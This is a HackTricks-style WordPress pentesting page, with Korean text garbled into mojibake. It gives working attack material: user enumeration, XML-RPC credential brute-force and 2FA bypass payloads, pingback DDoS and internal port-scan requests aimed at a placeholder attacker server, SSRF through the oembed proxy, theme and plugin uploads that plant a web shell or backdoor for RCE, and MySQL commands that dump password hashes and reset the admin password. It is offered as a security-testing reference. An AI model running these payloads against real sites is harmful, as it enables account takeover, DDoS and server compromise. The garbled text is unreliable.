# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

- **Uploaded** íŒŒì¼ì€ ë‹¤ìŒ ìœ„ì¹˜ì— ì €ì¥ë©ë‹ˆë‹¤: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **í…Œë§ˆ íŒŒì¼ì€ /wp-content/themes/ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤,** ë”°ë¼ì„œ í…Œë§ˆì˜ phpë¥¼ ë³€ê²½í•˜ì—¬ RCEë¥¼ ì–»ìœ¼ë ¤ëŠ” ê²½ìš° ì¼ë°˜ì ìœ¼ë¡œ í•´ë‹¹ ê²½ë¡œë¥¼ ì‚¬ìš©í•˜ê²Œ ë©ë‹ˆë‹¤. ì˜ˆ: **theme twentytwelve**ë¥¼ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒì—ì„œ **404.php** íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **ë˜ ë‹¤ë¥¸ ìœ ìš©í•œ URL:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` íŒŒì¼ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ ë£¨íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- í™•ì¸í•  ê¸°ë³¸ ë¡œê·¸ì¸ ê²½ë¡œ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt`ì—ëŠ” ì„¤ì¹˜ëœ WordPress ë²„ì „ê³¼ ê°™ì€ ìœ ìš©í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
- `wp-activate.php`ëŠ” ìƒˆë¡œìš´ WordPress ì‚¬ì´íŠ¸ë¥¼ ì„¤ì •í•  ë•Œ ì´ë©”ì¼ í™œì„±í™” ê³¼ì •ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- ë¡œê·¸ì¸ í´ë”(ìˆ¨ê¸°ê¸° ìœ„í•´ ì´ë¦„ì´ ë³€ê²½ë  ìˆ˜ ìˆìŒ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`ëŠ” HTTPë¥¼ ì „ì†¡ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, XMLì„ ì¸ì½”ë”© ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” WordPress ê¸°ëŠ¥ì„ ë‚˜íƒ€ë‚´ëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ í†µì‹ ì€ WordPressì˜ [REST API](https://developer.wordpress.org/rest-api/reference)ë¡œ ëŒ€ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.
- `wp-content` í´ë”ëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆê°€ ì €ì¥ë˜ëŠ” ì£¼ìš” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-content/uploads/`ëŠ” í”Œë«í¼ì— ì—…ë¡œë“œëœ ëª¨ë“  íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-includes/`ëŠ” ì¸ì¦ì„œ, ê¸€ê¼´, JavaScript íŒŒì¼ ë° ìœ„ì ¯ê³¼ ê°™ì€ í•µì‹¬ íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-sitemap.xml` WordPress 5.5 ì´ìƒ ë²„ì „ì—ì„œëŠ” ëª¨ë“  ê³µê°œ ê²Œì‹œë¬¼ ë° ê³µê°œì ìœ¼ë¡œ ì¿¼ë¦¬ ê°€ëŠ¥í•œ í¬ìŠ¤íŠ¸ íƒ€ì…ê³¼ ë¶„ë¥˜(taxonomies)ë¥¼ í¬í•¨í•œ sitemap XML íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.

Post exploitation

- `wp-config.php` íŒŒì¼ì—ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, ë°ì´í„°ë² ì´ìŠ¤ í˜¸ìŠ¤íŠ¸, ì‚¬ìš©ìëª… ë° ë¹„ë°€ë²ˆí˜¸, ì¸ì¦ í‚¤ì™€ ì†”íŠ¸, ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ì ‘ë‘ì‚¬ ë“± WordPressê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ì„± íŒŒì¼ì€ ë˜í•œ DEBUG ëª¨ë“œë¥¼ í™œì„±í™”í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ë¬¸ì œ í•´ê²° ì‹œ ìœ ìš©í•©ë‹ˆë‹¤.

### ì‚¬ìš©ì ê¶Œí•œ

- **Administrator**
- **Editor**: ê²Œì‹œí•˜ê³  ìì‹ ì˜ ë° íƒ€ì¸ì˜ ê²Œì‹œë¬¼ì„ ê´€ë¦¬í•©ë‹ˆë‹¤
- **Author**: ìì‹ ì˜ ê²Œì‹œë¬¼ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Contributor**: ê²Œì‹œë¬¼ì„ ì‘ì„±í•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë‚˜ ê²Œì‹œí•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤
- **Subscriber**: ê²Œì‹œë¬¼ì„ ì—´ëŒí•˜ê³  ìì‹ ì˜ í”„ë¡œí•„ì„ í¸ì§‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

## **Passive Enumeration**

### **WordPress ë²„ì „ í™•ì¸**

íŒŒì¼ `/license.txt` ë˜ëŠ” `/readme.html`ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

í˜ì´ì§€ì˜ **ì†ŒìŠ¤ ì½”ë“œ** ì•ˆì—ì„œ (ì˜ˆ: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ë§í¬ íŒŒì¼

![](<../../images/image (533).png>)

- JavaScript íŒŒì¼

![](<../../images/image (524).png>)

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### í…Œë§ˆ ê°€ì ¸ì˜¤ê¸°
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ì¼ë°˜ì ìœ¼ë¡œ ë²„ì „ ì¶”ì¶œí•˜ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ëŠ¥ë™ì  ì—´ê±°

### í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆ

ì•„ë§ˆ ëª¨ë“  í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë¥¼ ì°¾ì„ ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤. ëª¨ë‘ ì°¾ìœ¼ë ¤ë©´ **ì ê·¹ì ìœ¼ë¡œ Brute Forceí•˜ì—¬ í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆ ëª©ë¡ì„ ì¡°ì‚¬í•´ì•¼ í•©ë‹ˆë‹¤** (ìš´ì´ ì¢‹ë‹¤ë©´ ì´ëŸ¬í•œ ëª©ë¡ì„ í¬í•¨í•œ ìë™í™” ë„êµ¬ê°€ ìˆìŠµë‹ˆë‹¤).

### ì‚¬ìš©ì

- **ID Brute:** WordPress ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ì IDë¥¼ Brute Forcingí•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ìë¥¼ ì–»ìŠµë‹ˆë‹¤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ì‘ë‹µì´ **200** ë˜ëŠ” **30X**ì´ë©´ í•´ë‹¹ idê°€ **ìœ íš¨**í•˜ë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤. ì‘ë‹µì´ **400**ì´ë©´ idê°€ **ë¬´íš¨**ì…ë‹ˆë‹¤.

- **wp-json:** ì¿¼ë¦¬í•˜ì—¬ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì–´ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ì‚¬ìš©ìì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ `/wp-json/` endpointëŠ”:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Only information about the users that has this feature enable will be provided**.

ë˜í•œ **/wp-json/wp/v2/pages**ëŠ” IP ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **Login username enumeration**: ë¡œê·¸ì¸ ì‹œ **`/wp-login.php`**ì˜ **ë©”ì‹œì§€**ëŠ” ì§€ì •í•œ **username**ì˜ ì¡´ì¬ ì—¬ë¶€ì— ë”°ë¼ **ë‹¤ë¦…ë‹ˆë‹¤**.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

í™œì„±í™” ì—¬ë¶€ë¥¼ í™•ì¸í•˜ë ¤ë©´ _**/xmlrpc.php**_ì— ì ‘ê·¼í•´ ë‹¤ìŒ ìš”ì²­ì„ ë³´ë‚´ë³´ì„¸ìš”:

**í™•ì¸**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ë˜ëŠ” **`metaWeblog.getUsersBlogs`**ëŠ” credentialsë¥¼ brute-forceí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ë“¤ ì¤‘ ì¼ë¶€ì…ë‹ˆë‹¤. ë§Œì•½ ê·¸ ì¤‘ í•˜ë‚˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
credentialsê°€ ìœ íš¨í•˜ì§€ ì•Šì€ ê²½ìš° 200 ì‘ë‹µ ì½”ë“œ ë‚´ì— _"Incorrect username or password"_ ë©”ì‹œì§€ê°€ í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ì˜¬ë°”ë¥¸ credentialsë¥¼ ì‚¬ìš©í•˜ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì—ëŠ” ê²½ë¡œê°€ í‘œì‹œë©ë‹ˆë‹¤ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ë˜í•œ ë™ì¼í•œ ìš”ì²­ì—ì„œ ì—¬ëŸ¬ credentialsë¥¼ ì‹œë„í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— **`system.multicall`**ì„ ì‚¬ìš©í•´ credentialsë¥¼ brute-forceí•˜ëŠ” **ë” ë¹ ë¥¸ ë°©ë²•**ì´ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA ìš°íšŒ**

ì´ ë°©ë²•ì€ ì‚¬ëŒì„ ìœ„í•œ ê²ƒì´ ì•„ë‹ˆë¼ í”„ë¡œê·¸ë¨ìš©ìœ¼ë¡œ ë§Œë“¤ì–´ì§„ ì˜¤ë˜ëœ ë°©ì‹ì´ê¸° ë•Œë¬¸ì— 2FAë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ íš¨í•œ credsê°€ ìˆì§€ë§Œ ë©”ì¸ ë¡œê·¸ì¸ì— 2FAê°€ ê±¸ë ¤ ìˆë‹¤ë©´, **xmlrpc.phpë¥¼ ì•…ìš©í•´ í•´ë‹¹ credsë¡œ 2FAë¥¼ ìš°íšŒí•˜ì—¬ ë¡œê·¸ì¸í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤**. ì½˜ì†”ì—ì„œ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, Ippsecê°€ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ì—ì„œ ì„¤ëª…í•˜ë“¯ ì—¬ì „íˆ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤.

**DDoS ë˜ëŠ” port scanning**

ëª©ë¡ì—ì„œ _**pingback.ping**_ ë©”ì„œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ Wordpressê°€ ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸/í¬íŠ¸ë¡œ ìš”ì²­ì„ ë³´ë‚´ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì€ **ìˆ˜ì²œ**ì˜ Wordpress **ì‚¬ì´íŠ¸**ì—ê²Œ í•œ **ëŒ€ìƒ**ì— **ì ‘ê·¼**í•˜ë„ë¡ ìš”ì²­í•˜ì—¬ í•´ë‹¹ ìœ„ì¹˜ì—ì„œ **DDoS**ë¥¼ ë°œìƒì‹œí‚¤ê±°ë‚˜, Wordpressë¡œ ë‚´ë¶€ **ë„¤íŠ¸ì›Œí¬**ë¥¼ **scan**í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì„ì˜ì˜ í¬íŠ¸ë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŒ).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**0** (17)ë³´ë‹¤ **í°** ê°’ì„ ê°€ì§„ **faultCode**ë¥¼ ë°›ìœ¼ë©´, í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤.

ì´ ë°©ë²•ì„ ì•…ìš©í•´ DDoSë¥¼ ë°œìƒì‹œí‚¤ëŠ” ë°©ë²•ì„ ë°°ìš°ë ¤ë©´ ì´ì „ ì„¹ì…˜ì—ì„œ **`system.multicall`**ì˜ ì‚¬ìš©ì„ í™•ì¸í•˜ì„¸ìš”.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
When this file is **ì ‘ê·¼ë˜ë©´** a "**ë¬´ê±°ìš´**" MySQL **query** is performed, so I could be used by **ê³µê²©ì** to **cause** a **DoS**.\
Also, by default, the `wp-cron.php` is called on every page load (anytime a client requests any Wordpress page), which on high-traffic sites can cause problems (DoS).

It is recommended to disable Wp-Cron and create a real cronjob inside the host that perform the needed actions in a regular interval (without causing issues).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

This tool checks if the **methodName: pingback.ping** and for the path **/wp-json/oembed/1.0/proxy** and if exists, it tries to exploit them.

## ìë™í™” ë„êµ¬
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ë¹„íŠ¸ ë®ì–´ì“°ê¸°ë¡œ ì ‘ê·¼ íšë“

ì‹¤ì œ ê³µê²©ì´ë¼ê¸°ë³´ë‹¤ëŠ” í˜¸ê¸°ì‹¬ì— ê°€ê¹Œìš´ ì‚¬ë¡€ì…ë‹ˆë‹¤. CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ì—ì„œëŠ” ëª¨ë“  wordpress íŒŒì¼ì—ì„œ 1ë¹„íŠ¸ë¥¼ ë’¤ì§‘ì„ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ íŒŒì¼ `/var/www/html/wp-includes/user.php`ì˜ ìœ„ì¹˜ `5389`ì˜ ë¹„íŠ¸ë¥¼ ë’¤ì§‘ì–´ NOT (`!`) ì—°ì‚°ì„ NOPë¡œ ë§Œë“¤ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ì‚¬ìš©ëœ í…Œë§ˆì˜ php ìˆ˜ì • (ê´€ë¦¬ì ìê²© ì¦ëª… í•„ìš”)**

Appearance â†’ Theme Editor â†’ 404 Template (ì˜¤ë¥¸ìª½ì— ìˆìŒ)

php shellìš©ìœ¼ë¡œ ë‚´ìš©ì„ ë³€ê²½í•˜ì„¸ìš”:

![](<../../images/image (384).png>)

ì—…ë°ì´íŠ¸ëœ í˜ì´ì§€ì— ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠ”ì§€ ì¸í„°ë„·ì—ì„œ ì°¾ì•„ë³´ì„¸ìš”. ì´ ê²½ìš° ë‹¤ìŒ ì£¼ì†Œë¡œ ì ‘ê·¼í•˜ë©´ ë©ë‹ˆë‹¤: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ì„¸ì…˜ì„ ì–»ê¸° ìœ„í•´.

## Plugin RCE

### PHP plugin

.php íŒŒì¼ì„ pluginìœ¼ë¡œ ì—…ë¡œë“œí•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒê³¼ ê°™ì´ php backdoorë¥¼ ë§Œë“œì„¸ìš”:

![](<../../images/image (183).png>)

ê·¸ëŸ° ë‹¤ìŒ ìƒˆ pluginì„ ì¶”ê°€í•˜ì„¸ìš”:

![](<../../images/image (722).png>)

pluginì„ ì—…ë¡œë“œí•˜ê³  Install Nowë¥¼ ëˆ„ë¥´ì„¸ìš”:

![](<../../images/image (249).png>)

Proccedë¥¼ í´ë¦­í•˜ì„¸ìš”:

![](<../../images/image (70).png>)

ì•„ë§ˆë„ ì•„ë¬´ ì¼ë„ ì¼ì–´ë‚˜ì§€ ì•ŠëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ì§€ë§Œ, Mediaë¡œ ì´ë™í•˜ë©´ ì—…ë¡œë“œëœ shellì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../images/image (462).png>)

í•´ë‹¹ í•­ëª©ì— ì ‘ê·¼í•˜ë©´ reverse shellì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” URLì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ì´ ë°©ë²•ì€ ì·¨ì•½í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì§„ ì•…ì„± pluginì„ ì„¤ì¹˜í•˜ì—¬ web shellì„ ì–»ì„ ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ì ˆì°¨ì…ë‹ˆë‹¤. ì´ ê³¼ì •ì€ WordPress dashboardë¥¼ í†µí•´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. **Plugin Acquisition**: í•´ë‹¹ pluginì€ Exploit DBì™€ ê°™ì€ ì¶œì²˜ì—ì„œ íšë“í•©ë‹ˆë‹¤(ì˜ˆ: [**here**](https://www.exploit-db.com/exploits/36374)).
2. **Plugin Installation**:
- WordPress dashboardë¡œ ì´ë™í•œ ë’¤ `Dashboard > Plugins > Upload Plugin`ë¡œ ê°‘ë‹ˆë‹¤.
- ë‹¤ìš´ë¡œë“œí•œ pluginì˜ zip íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
3. **Plugin Activation**: pluginì´ ì„±ê³µì ìœ¼ë¡œ ì„¤ì¹˜ë˜ë©´ dashboardì—ì„œ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤.
4. **Exploitation**:
- "reflex-gallery" pluginì´ ì„¤ì¹˜Â·í™œì„±í™”ëœ ìƒíƒœë¼ë©´ ì·¨ì•½ì ì´ ì•Œë ¤ì ¸ ìˆì–´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Metasploit frameworkëŠ” ì´ ì·¨ì•½ì ì— ëŒ€í•œ exploitì„ ì œê³µí•©ë‹ˆë‹¤. ì ì ˆí•œ ëª¨ë“ˆì„ ë¡œë“œí•˜ê³  íŠ¹ì • ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ meterpreter sessionì„ í™•ë³´í•˜ì—¬ ì‚¬ì´íŠ¸ì— ë¬´ë‹¨ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì´ëŠ” WordPress ì‚¬ì´íŠ¸ë¥¼ ì•…ìš©í•˜ëŠ” ì—¬ëŸ¬ ë°©ë²• ì¤‘ í•˜ë‚˜ì— ë¶ˆê³¼í•˜ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.

ì´ ë‚´ìš©ì—ëŠ” WordPress dashboardì—ì„œ pluginì„ ì„¤ì¹˜í•˜ê³  í™œì„±í™”í•˜ëŠ” ì ˆì°¨ë¥¼ ë³´ì—¬ì£¼ëŠ” ì‹œê° ìë£Œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ê²ƒì€ ì ì ˆí•œ ê¶Œí•œ ì—†ì´ ë¶ˆë²•ì ì´ê³  ë¹„ìœ¤ë¦¬ì ì„ì„ ë°˜ë“œì‹œ ì£¼ì˜í•˜ì„¸ìš”. ì´ ì •ë³´ëŠ” ì±…ì„ê° ìˆê²Œ, ì˜ˆë¥¼ ë“¤ì–´ ëª…ì‹œì  í—ˆê°€ë¥¼ ë°›ì€ penetration testingê³¼ ê°™ì€ í•©ë²•ì  ë§¥ë½ì—ì„œë§Œ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ëŠ” WordPressì—ì„œ **Cross-Site Scripting (XSS)** ì·¨ì•½ì ì„ **Remote Code Execution (RCE)** ë˜ëŠ” ë‹¤ë¥¸ ì‹¬ê°í•œ ì·¨ì•½ì ìœ¼ë¡œ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆë„ë¡ ì„¤ê³„ëœ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ë¥¼ í™•ì¸í•˜ì„¸ìš”. ë‹¤ìŒì„ ì§€ì›í•©ë‹ˆë‹¤:
- _**Privilege Escalation:**_ WordPressì— ì‚¬ìš©ìë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ ì»¤ìŠ¤í…€ plugin(backdoor)ì„ WordPressì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.
- _**(RCE) Built-In Plugin Edit:**_ WordPressì˜ Built-In Pluginsì„ í¸ì§‘í•©ë‹ˆë‹¤.
- _**(RCE) Built-In Theme Edit:**_ WordPressì˜ Built-In Themesë¥¼ í¸ì§‘í•©ë‹ˆë‹¤.
- _**(Custom) Custom Exploits:**_ ì„œë“œíŒŒí‹° WordPress Plugins/Themesì— ëŒ€í•œ Custom Exploitsë¥¼ ì œê³µí•©ë‹ˆë‹¤.

## Post Exploitation

ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ ë³€ê²½:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress í”ŒëŸ¬ê·¸ì¸ Pentest

### ê³µê²© í‘œë©´

Wordpress í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ë…¸ì¶œí•˜ëŠ”ì§€ ì•„ëŠ” ê²ƒì€ í•´ë‹¹ ê¸°ëŠ¥ì˜ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° í•µì‹¬ì ì…ë‹ˆë‹¤. í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ”ì§€ëŠ” ë‹¤ìŒ í•­ëª©ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ì˜ ì˜ˆì‹œëŠ” [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **`wp_ajax`**

